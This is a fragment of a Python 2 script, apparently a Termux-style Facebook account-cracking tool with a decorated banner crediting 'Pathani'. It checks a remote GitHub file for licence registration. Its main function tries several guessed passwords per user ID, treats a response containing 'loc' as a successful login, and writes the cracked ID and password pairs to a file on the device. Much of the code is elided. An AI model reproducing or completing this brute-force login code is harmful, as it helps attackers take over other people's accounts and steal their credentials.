...
\033[1;95m ┗┛╋╋┗┛┗┻━┻┛┗┻┛┗┻┛┗┻┛
\033[1;94m═══════•×•×•×•×•×•×•×•×•×•×•×•×•×•×═══════
\033[1;96m➣ 𝑂𝑤𝑛𝑒𝑟 : \033[1;97mℙ𝕒𝕥𝕙𝕒𝕟𝕚
\033[1;96m➣ Ƒß  : \033[1;97m𝕩𝕥𝕪𝕝𝕚𝕤𝕙.𝕡𝕒𝕥𝕙𝕒𝕟𝕚.𝟚𝟘𝟚𝟙
\033[1;96m➣ 𝑄𝑢𝑒𝑒𝑛  : \033[1;97m𝕋𝔽𝔾 𝕆𝕨𝕟𝕖𝕣         
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/muskanpathani/muski/main/server.txt').text
    if to in r:
...
def menu_s():
    ms = raw_input('\033[1;92m╰─PATHANI➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[PATHANI-OK] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[PATHANI-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/KING_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[PATHANI-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/KING_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
